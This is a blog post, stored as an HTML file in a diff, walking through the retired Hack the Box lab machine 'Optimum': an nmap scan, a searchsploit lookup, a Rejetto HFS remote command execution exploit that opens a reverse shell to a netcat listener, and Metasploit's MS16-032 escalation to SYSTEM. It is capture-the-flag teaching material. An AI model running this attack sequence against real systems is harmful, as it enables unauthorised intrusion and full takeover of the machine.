@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+	<title>Hack the Box - Optimum - Calxus Blog</title>
+
+  <!-- Edit site and author settings in `_config.yml` to make the social details your own -->
+
+    <meta content="Calxus Blog" property="og:site_name">
+  
+    <meta content="Hack the Box - Optimum" property="og:title">
+  
+  
+    <meta content="article" property="og:type">
+  
+  
+    <meta content="Optimum is a beginner-level machine which mainly focuses on enumeration of services with known exploits. Both exploits are easy to obtain and have associated Metasploit modules, making this machine fairly simple to complete." property="og:description">
+  
+  
+    <meta content="http://localhost:4000/optimum-walkthrough/" property="og:url">
+  
+  
+    <meta content="2020-05-04T23:23:22+01:00" property="article:published_time">
+    <meta content="http://localhost:4000/about/" property="article:author">
+  
+  
+    <meta content="http://localhost:4000/assets/img/optimum.png" property="og:image">
+  
+  
+    
+    <meta content="HackTheBox" property="article:section">
+    
+  
+  
+    
+    <meta content="Easy" property="article:tag">
+    
+    <meta content="Windows" property="article:tag">
+    
+    <meta content="Retired" property="article:tag">
+    
+    <meta content="CVE" property="article:tag">
+    
+  
+  
+
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@">
+    <meta name="twitter:creator" content="@TheCalxus">
+  
+    <meta name="twitter:title" content="Hack the Box - Optimum">
+  
+  
+    <meta name="twitter:url" content="http://localhost:4000/optimum-walkthrough/">
+  
+  
+    <meta name="twitter:description" content="Optimum is a beginner-level machine which mainly focuses on enumeration of services with known exploits. Both exploits are easy to obtain and have associated Metasploit modules, making this machine fairly simple to complete.">
+  
+  
+    <meta name="twitter:image:src" content="http://localhost:4000/assets/img/optimum.png">
+  
+
+	<meta name="description" content="Optimum is a beginner-level machine which mainly focuses on enumeration of services with known exploits. Both exploits are easy to obtain and have associated Metasploit modules, making this machine fairly simple to complete.">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<meta property="og:image" content="">
+	<link rel="shortcut icon" href="/assets/img/favicon/favicon.ico" type="image/x-icon">
+	<!-- Chrome, Firefox OS and Opera -->
+	<meta name="theme-color" content="#263959">
+	<!-- Windows Phone -->
+	<meta name="msapplication-navbutton-color" content="#263959">
+	<!-- iOS Safari -->
+	<meta name="apple-mobile-web-app-status-bar-style" content="#263959">
+	<!-- Google Fonts -->
+	<link href="https://fonts.googleapis.com/css?family=PT+Serif:400,700|Lato:300,400,700&display=swap" rel="stylesheet">
+	<!-- Font Awesome -->
+	<link rel="stylesheet" href="/assets/fonts/font-awesome/css/font-awesome.min.css">
+	<!-- Styles -->
+	<link rel="stylesheet" href="/assets/css/main.css">
+</head>
+
+<body>
+
+  <div class="wrapper">
+    <aside class="sidebar">
+  <header>
+    <div class="about">
+      <div class="cover-author-image">
+        <a href="/"><img src="/assets/img/calxus.png" alt="Calxus"></a>
+      </div>
+      <div class="author-name">Calxus</div>
+      <p>DevOps Engineer with a penchant for pentesting and proud owner of an over-engineered home network</p>
+      <div style="height: 5px"></div>
+      <div class="author-name"><a href="/hackthebox">hack the box</a></div>
+      <div class="site-category"><a href="/homenetwork">home network</a></div>
+    </div>
+  </header> <!-- End Header -->
+  <footer>
+    <section class="contact">
+      <h3 class="contact-title">Contact me</h3>
+      <ul>
+        <li><a href="https://twitter.com/TheCalxus" target="_blank"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
+        <li class="github"><a href="http://github.com/calxus" target="_blank"><i class="fa fa-github"></i></a></li>
+        <li class="email"><a href="mailto:calxus@protonmail.ch"><i class="fa fa-envelope-o"></i></a></li>
+        <li><a href="https://hackthebox.eu/profile/317303" target="_blank"><i class="fa fa-cube"></i></a></li>
+      </ul>
+    </section> <!-- End Section Contact -->
+    <div class="copyright">
+      <p>2021 &copy; Calxus</p>
+    </div>
+  </footer> <!-- End Footer -->
+</aside> <!-- End Sidebar -->
+<div class="content-box clearfix">
+  <article class="article-page">
+  <div class="page-content">
+    
+    <div class="page-cover-image">
+      <figure>
+        <img class="page-image" src=/assets/img/optimum.png alt="Hack the Box - Optimum">
+        
+          <figcaption>Optimum</figcaption>
+        
+      </figure>
+    </div> <!-- End Page Cover Image -->
+    
+    <div class="wrap-content">
+      <header class="header-page">
+        <h1 class="page-title">Hack the Box - Optimum</h1>
+        <div class="page-date"><span>2020, May 04&nbsp;&nbsp;&nbsp;&nbsp;</span></div>
+      </header>
+      <h2 id="overview">Overview</h2>
+<p>Optimum is a beginner-level machine which mainly focuses on enumeration of services with known exploits. Both exploits are easy to obtain and have associated Metasploit modules, making this machine fairly simple to complete.</p>
+<h2 id="enumeration">Enumeration</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/optimum]
+└─$ sudo nmap -p- -T4  10.129.57.165                                                                
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-14 23:50 GMT
+Nmap scan report for 10.129.57.165
+Host is up (0.017s latency).
+Not shown: 65534 filtered ports
+PORT   STATE SERVICE
+80/tcp open  http
+</code></pre></div></div>
+<p>When I navigated to that port in a browser the landing page exposed the application and version number. Searching exploitdb for an exploit revealed a python script.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/optimum]
+└─$ searchsploit hfs 2.3            
+----------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                     |  Path
+----------------------------------------------------------------------------------- ---------------------------------
+HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)                        | multiple/remote/48569.py
+Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                     | multiple/remote/30850.txt
+Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                | windows/remote/34668.txt
+Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                | windows/remote/39161.py
+Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution           | windows/webapps/34852.txt
+----------------------------------------------------------------------------------- ---------------------------------
+
+┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/optimum]
+└─$ searchsploit -m 39161
+  Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
+      URL: https://www.exploit-db.com/exploits/39161
+     Path: /usr/share/exploitdb/exploits/windows/remote/39161.py
+File Type: Python script, ASCII text executable, with very long lines, with CRLF line terminators
+
+Copied to: /home/calxus/hackthebox/optimum/39161.py
+</code></pre></div></div>
+<h2 id="foothold">Foothold</h2>
+<p>The only changes that were necessary to make this exploit run are adding the IP and port that our netcat listener are running on. We also need to host a file server that netcat is hosted in.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/optimum]
+└─$ python 39161.py 10.129.57.165 80
+</code></pre></div></div>
+<p>Once the the exploit is run we should receive a shell.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/optimum]
+└─$ nc -nlvp 4499
+listening on [any] 4499 ...
+connect to [10.10.14.27] from (UNKNOWN) [10.129.57.165] 49166
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Users\kostas\Desktop&gt; whoami
+ whoami
+optimum\kostas
+</code></pre></div></div>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>In order to get system on this machine I had to upload a metasploit binary and send back a meterpreter shell. When I did this I then ran the local_exploit_suggester and found it could be vulnerable to MS16-032. When I ran this exploit I got a system shell.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 post(multi/recon/local_exploit_suggester) &gt; exploit
+
+[*] 10.129.57.165 - Collecting local exploits for x86/windows...
+[*] 10.129.57.165 - 37 exploit checks are being tried...
+[+] 10.129.57.165 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+[+] 10.129.57.165 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
+[*] Post module execution completed
+
+msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) &gt; exploit
+
+[*] Started reverse TCP handler on 10.10.14.27:4444 
+[+] Compressed size: 1016
+[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
+...
+[+] Executed on target machine.
+[*] Sending stage (175174 bytes) to 10.129.57.165
+[*] Meterpreter session 2 opened (10.10.14.27:4444 -&gt; 10.129.57.165:49184) at 2021-03-15 00:42:00 +0000
+[+] Deleted C:\Users\kostas\AppData\Local\Temp\LljWcYKZFA.ps1
+
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+</code></pre></div></div>
+
+      <div class="page-footer">
+        <div class="page-share">
+          <a href="https://twitter.com/intent/tweet?text=Hack the Box - Optimum&url=http://localhost:4000/optimum-walkthrough/" title="Share on Twitter" rel="nofollow" target="_blank">Twitter</a>
+          <a href="https://facebook.com/sharer.php?u=http://localhost:4000/optimum-walkthrough/" title="Share on Facebook" rel="nofollow" target="_blank">Facebook</a>
+          <a href="https://plus.google.com/share?url=http://localhost:4000/optimum-walkthrough/" title="Share on Google+" rel="nofollow" target="_blank">Google+</a>
+        </div>
+        <div class="page-tag">
+          
+            <a href="/tags#Easy" class="tag">&#35; Easy</a>
+          
+            <a href="/tags#Windows" class="tag">&#35; Windows</a>
+          
+            <a href="/tags#Retired" class="tag">&#35; Retired</a>
+          
+            <a href="/tags#CVE" class="tag">&#35; CVE</a>
+          
+        </div>
+      </div>
+    </div> <!-- End Wrap Content -->
+  </div> <!-- End Page Content -->
+</article> <!-- End Article Page -->
+
+</div>
+
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@12.0.0/dist/lazyload.min.js"></script>
+<script src="/assets/js/main.js"></script>
+
+</body>
+</html>
